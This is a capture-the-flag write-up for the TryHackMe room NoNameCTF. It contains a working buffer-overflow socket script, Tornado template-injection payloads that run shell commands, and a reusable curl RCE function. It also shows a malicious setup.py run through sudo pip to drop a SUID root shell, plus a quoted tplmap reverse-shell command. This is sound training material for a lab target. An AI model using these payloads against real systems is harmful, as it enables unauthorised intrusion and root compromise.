# NoNameCTF — TryHackMe Full Writeup

## 1. Reconnaissance

### 1.1 Port scan

```bash
nmap -sV -sC --top-ports 1000 -T4 10.49.142.224
nmap -p- --min-rate 1000 -T4 10.49.142.224
```

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH 7.2p2 (Ubuntu) | SSH |
| 80/tcp | Apache httpd 2.4.18 | Static page with hints |
| 2222/tcp | Custom "NoNameCTF" menu service | Register / login / buffer store |
| 9090/tcp | Tornado httpd 6.0.3 (Python 3.5) | Debug mode on → **SSTI target** |

### 1.2 Port 80 — hint page

```bash
curl -s http://10.49.142.224/
```

```html
<html>
<head></head>
<body>
<!--char buffer[250]; -->
<!--A*1000-->
        checkme!
</body>
</html>
```

The HTML comments disclose the next-stage buffer-overflow technique: a **250-byte buffer**, overflowed by sending ~**1000+ `A` characters**.

### 1.3 Port 9090 — Tornado leaks the username

```bash
curl -s -i http://10.49.142.224:9090/
```

A root request returns a **404 with a full Python traceback** (debug mode enabled), disclosing the service user and app path:

```
File "/home/zeldris/.local/lib/python3.5/site-packages/tornado/web.py", ...
tornado.web.HTTPError: HTTP 404: Not Found
```

→ Username **`zeldris`**. No handler is registered at `/`, and directory brute-forcing (`common.txt`, `raft-medium-words.txt`) finds **nothing** — the real route is a non-dictionary secret that must be obtained from the port 2222 service.

---

## 2. Port 2222 — Buffer Overflow → Secret-Directory Disclosure

### 2.1 Understanding the service

```
Welcome to the NoNameCTF!
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
```

- **Option 1** — register a user (enforces a minimum password length)
- **Option 2** — login (required before options 3 and 4)
- **Option 4** — `store_your_buffer`: saves an attacker-controlled buffer
- **Option 3** — `get_secret_directory`: prints `My secret in the port 9090 is: <...>`

For a normal authenticated user, option 3 returns **empty**. Storing a short buffer (option 4) and reading it back (option 3) simply echoes the input — a decoy that teaches the mechanism. User enumeration works (`admin` → *"already registered"*), but admin creds are **not required**.

### 2.2 The vulnerability

The stored buffer and the real `secret` directory string are **adjacent in memory**. A short/normal store leaves the secret untouched (and empty-looking). Overflowing the buffer with a large payload (**1500 `A`s**, per the port-80 hint) corrupts the adjacent variable/pointer so that `get_secret_directory` prints the **real hidden directory** instead of the attacker's data.

### 2.3 Exploit script

```python
# leak_dir.py — register, login, overflow, leak the 9090 directory
import socket, time

s = socket.socket(); s.connect(("10.49.142.224", 2222)); s.settimeout(6)
def rd(t=1.0):
    time.sleep(t)
    try: return s.recv(65535)
    except: return b""
def snd(x): s.sendall(x if isinstance(x, bytes) else x.encode()); time.sleep(0.3)

rd()
snd("1\n"); rd(); snd("zed\n"); rd(); snd("zedpass123\n"); rd()   # register
snd("2\n"); rd(); snd("zed\n"); rd(); snd("zedpass123\n"); rd()   # login
snd("4\n"); rd(); snd(b"A"*1500 + b"\n"); rd()                    # overflow
snd("3\n")                                                        # leak
out = b"".join(rd(0.9) for _ in range(5))
s.close()

i = out.find(b"is: ")
val = out[i+4:]; val = val[:val.find(b"\r\nChoose")]
print("Leaked directory:", val.decode(errors="replace"))
```

```
Leaked directory: /40b5dffec4e39b7a3e9d261d2fc4a038/
```

**Hidden Tornado route:** `/40b5dffec4e39b7a3e9d261d2fc4a038/`

---

## 3. Port 9090 — Tornado Server-Side Template Injection

### 3.1 Find the injection point

```bash
curl -s "http://10.49.142.224:9090/40b5dffec4e39b7a3e9d261d2fc4a038/"
```

The page renders `Hello  ` and the source hides a parameter hint:

```html
<!-- ?hackme= -->
```

The `hackme` GET parameter is reflected after `Hello` and rendered by **Tornado's template engine**.

### 3.2 Confirm SSTI

```bash
curl -s "http://10.49.142.224:9090/40b5dffec4e39b7a3e9d261d2fc4a038/?hackme=%7B%7B7*7%7D%7D"
# → Hello 49
```

### 3.3 RCE

Tornado templates execute arbitrary Python via `{% %}` / `{{ }}`:

```
{% import os %}{{os.popen('id').read()}}
```

```bash
curl -s -G "http://10.49.142.224:9090/40b5dffec4e39b7a3e9d261d2fc4a038/" \
  --data-urlencode "hackme={% import os %}{{os.popen('id').read()}}"
# → Hello uid=1000(zeldris) gid=1000(zeldris) groups=1000(zeldris),4(adm),24(cdrom),27(sudo),...
```

Code execution as **`zeldris`** (a member of `sudo`).

> Alternative (per the original room): clone **tplmap** and run
> `python tplmap.py -u "http://10.49.142.224:9090/40b5dffec4e39b7a3e9d261d2fc4a038/?hackme=" --reverse-shell <YOUR_IP> <PORT>`
> for an interactive reverse shell.

### 3.4 Reusable one-liner

```bash
rce() { curl -s -G "http://10.49.142.224:9090/40b5dffec4e39b7a3e9d261d2fc4a038/" \
  --data-urlencode "hackme={% import os %}{{os.popen('$1').read()}}" \
  | python3 -c "import sys,html,re;d=sys.stdin.read();m=re.search(r'Hello (.*?)\s*(</p>|</div>)',d,re.S);print(html.unescape(m.group(1)) if m else d[:500])"; }
```

### 3.5 User flag

```bash
rce 'cat /home/zeldris/user.txt'
# → THM{SSTI_AND_BUFFER_OVERFLOW_W4S_HERE}
```

---

## 4. Privilege Escalation — GTFOBins `pip`

### 4.1 Enumerate sudo rights

```bash
rce 'sudo -n -l 2>&1'
```

```
User zeldris may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root : root) NOPASSWD: /usr/bin/pip install *
```

`(ALL : ALL) ALL` needs a password, but **`NOPASSWD: /usr/bin/pip install *`** does not. `pip install <dir>` executes that package's `setup.py` **as root** → arbitrary root code execution. ([GTFOBins: pip](https://gtfobins.github.io/gtfobins/pip/))

### 4.2 Exploit

Script (base64-delivered through the RCE to avoid quoting issues):

```bash
TF=$(mktemp -d)
cat > $TF/setup.py <<'PY'
import os
os.system("cat /root/root.txt > /tmp/rt; chmod 666 /tmp/rt; "
          "cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; id > /tmp/proof")
PY
sudo /usr/bin/pip install $TF
```

Delivered via:

```bash
B64=$(base64 -w0 privesc.sh)
rce "echo $B64 | base64 -d | bash"
```

### 4.3 Proof of root + root flag

```bash
rce 'cat /tmp/proof'
# → uid=0(root) gid=0(root) groups=0(root)

rce 'cat /tmp/rt'
# → THN{F4KE_PIP_PACKAGE_INSTALL}

# SUID root shell also dropped:
rce '/tmp/rootbash -p -c "id; cat /root/root.txt"'
# → euid=0(root) ... THN{F4KE_PIP_PACKAGE_INSTALL}
```

**Root flag:** `THN{F4KE_PIP_PACKAGE_INSTALL}`

### 4.4 Cleanup

```bash
rce '/tmp/rootbash -p -c "rm -f /tmp/rootbash /tmp/rt /tmp/proof"'
```
